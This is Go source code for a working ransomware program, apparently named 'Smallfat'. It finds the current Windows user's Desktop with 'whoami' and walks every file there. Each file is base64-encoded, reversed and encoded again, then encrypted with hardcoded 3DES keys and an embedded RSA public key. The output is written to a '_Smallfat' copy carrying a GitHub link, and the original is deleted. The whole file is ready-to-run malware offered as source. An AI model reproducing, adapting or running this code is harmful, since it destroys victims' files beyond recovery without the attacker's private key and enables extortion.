package main

import (
	"bufio"
	"bytes"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"github.com/wumansgy/goEncrypt"
	"io/ioutil"
	"os"
	"os/exec"
	"path"
	"path/filepath"
	"strings"
	"sync"
)

var (
	wg        sync.WaitGroup
	key       = []byte("FTXs8EjMOPhl6nLhvP7eAOGO")
	ivdes     = []byte("FLAzc3RC")
	PublicKey = []byte(`
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtxlZg6F+OS+JnfjUZ7Hq
QL1Mj/MTWUm9XmPLnCrrdEep36e50HtQqpzL8hYTPTGDW1B0do0u5EKDpZWGZVFO
5JvSOY6Oilf3XwhO8aM3zrnotRc2duT6Mtm9iOtpUabwl4QtlNFTCbFWPy+h4gdm
/ANkyWSThHmxwHs5jepotxPHTQNTiJ5gsLL2NjX3Jg5PtYv7hefZy9EGHL0D40X3
ylwvqTP9CHNBupz9SMv4K/xh8NaufCMsi9lg3VK42HO0aKqATEgCP0TN8i+XSXAO
yawQiSR70Dj7RQt3ezcgzT7HsoF5y+470TQHBRMDu+NHAWW4n8Dd/0rcqtRgC2HJ
gwIDAQAB
-----END PUBLIC KEY-----
`)
)

func Del_File(fileName string) {
	err := os.Remove(fileName)
	if err != nil {
		return
	}
}

func Encrypt(fileName string, key, publicKeyByte []byte) {
	//Base64编码->反转->Base64编码
	file_byte, _ := ioutil.ReadFile(fileName)
	encryption := base64.StdEncoding.EncodeToString(file_byte)
	Reverses := Reverse(encryption)
	Reverses_Encryption := base64.StdEncoding.EncodeToString([]byte(Reverses)) //Base64密文
	//三重DES CBC加密
	DES_Encryption, _ := goEncrypt.TripleDesEncrypt([]byte(Reverses_Encryption), key, ivdes) //DES密文
	//RSA加密
	rsablock, _ := pem.Decode(publicKeyByte)
	publicKey, _ := x509.ParsePKIXPublicKey(rsablock.Bytes)
	keySize, DESSize := publicKey.(*rsa.PublicKey).Size(), len(DES_Encryption)
	pub := publicKey.(*rsa.PublicKey)
	offSet, once := 0, keySize-11
	buffer := bytes.Buffer{}
	for offSet < DESSize {
		endIndex := offSet + once
		if endIndex > DESSize {
			endIndex = DESSize
		}
		bytesOnce, _ := rsa.EncryptPKCS1v15(rand.Reader, pub, DES_Encryption[offSet:endIndex])
		buffer.Write(bytesOnce)
		offSet = endIndex
	}
	RSA_Encryption := buffer.Bytes() //RSA密文
	//写入文件
	content := `https://github.com/RuanLang0777/Smallfat` + "\r\n\r\n" + string(RSA_Encryption)
	baseName := path.Base(fileName)           // 获取文件名+后缀
	ext := path.Ext(baseName)                 // 获取后缀
	name := strings.TrimSuffix(baseName, ext) //获取文件名
	WriteFile, err := os.OpenFile(name+"_Smallfat"+ext, os.O_RDONLY|os.O_CREATE|os.O_APPEND, 0666)
	if err != nil {
		return
	}
	defer WriteFile.Close()
	buf := bufio.NewWriterSize(WriteFile, len(RSA_Encryption))
	buf.Write([]byte(content))
	err = buf.Flush()
	if err != nil {
		return
	}
	Del_File(fileName)
}

func Reverse(base64 string) string {
	//反转
	str := []rune(base64)
	for i, j := 0, len(str)-1; i < j; i, j = i+1, j-1 {
		str[i], str[j] = str[j], str[i]
	}
	return string(str)
}

func Get_User() string {
	//获取用户名
	cmd := exec.Command("whoami")
	out, _ := cmd.CombinedOutput()
	whoami := strings.Split(string(out), "\\")[1]
	paths := `C:\Users\` + whoami + `\Desktop`
	desktop := strings.Replace(paths, "\r\n", "", 1)
	return desktop
}

func WalkFunc(fileName string, info os.FileInfo, err error) error {
	//遍历文件
	if info.IsDir() {
		return nil
	}
	if !strings.Contains(fileName, "_Smallfat") {
		wg.Add(1)
		go func() {
			defer wg.Add(-1)
			Encrypt(fileName, key, PublicKey)

		}()
		wg.Wait()
		return nil
	}
	return nil

}

func Run(root string) {
	err := filepath.Walk(root, WalkFunc)
	if err != nil {
		return
	}
}

func main() {
	Run(Get_User())
}
